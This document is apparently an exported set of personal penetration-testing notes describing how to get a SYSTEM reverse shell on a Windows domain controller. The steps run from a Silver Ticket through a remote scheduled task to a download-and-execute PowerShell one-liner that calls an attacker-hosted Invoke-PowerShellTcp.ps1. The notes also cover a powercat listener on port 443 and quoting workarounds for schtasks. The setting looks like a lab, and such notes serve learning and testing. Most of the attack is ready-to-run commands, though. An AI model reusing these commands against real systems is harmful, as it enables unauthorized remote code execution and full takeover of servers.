<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Schedule Reverse Powershell(option 2)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Schedule Reverse Powershell(option 2)</h1><br/>Github InvokePowershellTcp.ps1: <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a><br />Github powercat.ps1: <a href="https://github.com/besimorhino/powercat/blob/master/powercat.ps1">https://github.com/besimorhino/powercat/blob/master/powercat.ps1</a><br />schtasks single and double quotes problem: <a href="https://stackoverflow.com/questions/26400674/single-quotes-in-schtasks-command">https://stackoverflow.com/questions/26400674/single-quotes-in-schtasks-command</a><br /><br />2. Download <em>Invoke-PowerShellTcp.ps1</em> from <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a> and at the end of the file add Invoke-PowerShellTcp -Reverse -IpAddress [AttackerIP] -Port [AttackerPort]<br />    <a href=""><img src="images/1152-1.png" alt="images/1152-1.png" /></a><br />3. Use a program to make a HTTP File Server like <a href="https://www.rejetto.com/hfs/?f=dl">HFS</a>. And upload the just edited <em>Invoke-PowerShellTcp.ps1</em><br />    <a href=""><img src="images/1152-2.png" alt="images/1152-2.png" /></a><br />5. Schedule and execute a task <br />    Remember that the value of /TR cannot be more than 261 characters. <br />    schtasks does not allow use single quotes because of that we had to use a lot of backslash(\), and backtip(`). <br />    This is been explained on this <a href="https://stackoverflow.com/questions/26400674/single-quotes-in-schtasks-command">post of stackoverflow</a>. We can summarize it by saying that when we use <span style="text-decoration:underline;">schtasks</span> we have to use:<br />      ▪ Quotes “ → ”  <br />      ▪ SubQuotes → \`&quot; <br />      ▪ SubSubQuotes → \\\`&quot;<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; schtasks <span style="color:#ff9d00;font-weight:700">/</span>create <span style="color:#ff9d00;font-weight:700">/</span>S testdc.daniele.local <span style="color:#ff9d00;font-weight:700">/SC</span> Weekly <span style="color:#ff9d00;font-weight:700">/</span>RU <span style="color:#3ad900;font-weight:400">&quot;NT Authority\SYSTEM&quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>TN <span style="color:#3ad900;font-weight:400">&quot;STCheck&quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>TR <span style="color:#3ad900;font-weight:400">&quot;powershell.exe -nop -exec bypass -c \`&quot;</span><span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).DownloadString(<span style="color:#ff9d00;font-weight:700">\\\`</span><span style="color:#3ad900;font-weight:400">&quot;http://192.168.1.118/Invoke-PowerShellTcp.ps1\\\`&quot;</span>); <span style="color:#ff9d00;font-weight:700">\`</span><span style="color:#3ad900;font-weight:400">&quot;&quot;</span></pre></div>   <br />   ◇ If we give us: &quot;<span style="color:#ff0000;">ERROR:Access Denied</span>&quot; maybe is because the Silver Ticket is older than 20 minutes. This mean we have to remake it(Point 1)<br />   ◇ If we give use: “<span style="color:#ff0000;">ERROR: No mapping between account names and security IDs was done</span>” maybe the username for /RU [username] does not exist.<br />        try “Administrator” or &quot;NT Authority\SYSTEM&quot; <br />       <a href=""><img src="images/1152-3.png" alt="images/1152-3.png" /></a><br />   If we have access to the Windows Server, we can go to:<br />   <em>Server Manager → Tools → Task Manager → Task Schedule Library → right click on our task → Proprieties  → Actions</em><br />   we can see that the command will be reinterpreted and executed like that by the Windows Server:<br />    <a href=""><img src="images/1152-4.png" alt="images/1152-4.png" /></a><br />   <br />   <br />6. We can check if the task is been created by querying the server:<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; schtasks <span style="color:#ff9d00;font-weight:700">/</span>query <span style="color:#ff9d00;font-weight:700">/</span>S testdc.daniele.local</pre></div><br />    <a href=""><img src="images/1152-5.png" alt="images/1152-5.png" /></a><br />7. Now we have to create a channel listening on our machine on the Port specified(in our case 443)<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).DownloadString(<span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&quot;</span>)<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; powercat <span style="color:#ff9d00;font-weight:700">-</span>l <span style="color:#ff9d00;font-weight:700">-</span>v <span style="color:#ff9d00;font-weight:700">-</span>p <span style="color:#333333;font-weight:400">443</span> <span style="color:#ff9d00;font-weight:700">-</span>t <span style="color:#333333;font-weight:400">1000</span>     <span style="color:#0088ff;font-weight:400">#listening on port 443</span></pre></div><br />    <a href=""><img src="images/1152-6.png" alt="images/1152-6.png" /></a><br />8. Now we can run the scheduled task “STCheck” created before<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; schtasks <span style="color:#ff9d00;font-weight:700">/</span>Run <span style="color:#ff9d00;font-weight:700">/</span>S testdc.daniele.local <span style="color:#ff9d00;font-weight:700">/</span>TN <span style="color:#3ad900;font-weight:400">&quot;STCheck&quot;</span></pre></div><br />    <a href=""><img src="images/1152-7.png" alt="images/1152-7.png" /></a><br /><br />-nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(\&quot;<a href="http://192.168.1.118/Invoke-PowerShellTcp.ps1\");">http://192.168.1.118/Invoke-PowerShellTcp.ps1\&quot;);</a> &quot;<br /></div>
</body>
</html>
